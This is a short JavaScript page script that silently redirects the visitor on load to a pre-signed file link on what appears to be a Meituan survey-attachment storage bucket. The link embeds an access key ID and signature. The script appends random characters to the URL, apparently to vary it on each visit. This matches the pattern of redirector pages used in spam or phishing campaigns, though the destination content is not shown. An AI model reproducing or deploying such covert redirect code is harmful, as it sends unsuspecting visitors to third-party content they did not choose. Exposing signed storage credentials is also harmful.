var urls=[
' https://s3plus.meituan.com/meituan-wenjuan-attachment/1525286082_171526574045617664?AWSAccessKeyId=SRV_wxUeXpN6t5YroxFUqtHV4EIWj8IkEdB1&Expires=1717857740&Signature=anyx2OVZV6Ukdv%2BbJD8qyHCbUow%3D#{nnnnnnn}{wwww}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
